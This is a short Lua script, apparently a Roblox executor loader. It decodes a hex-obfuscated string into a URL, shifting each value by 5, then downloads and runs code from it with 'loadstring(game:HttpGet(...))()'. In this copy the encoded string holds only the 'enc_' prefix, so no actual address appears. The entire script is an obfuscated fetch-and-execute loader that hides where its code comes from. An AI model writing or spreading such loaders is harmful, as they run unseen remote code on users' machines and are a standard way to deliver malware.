local encoded = "enc_"
if not encoded:find("enc_", 1, true) then error("Invalid format") end

local hex = encoded:sub(5)
local result = ""
for i = 1, #hex, 3 do
    local charCode = tonumber(hex:sub(i, i + 2), 16) - 5
    result = result .. string.char(charCode)
end

loadstring(game:HttpGet(result))()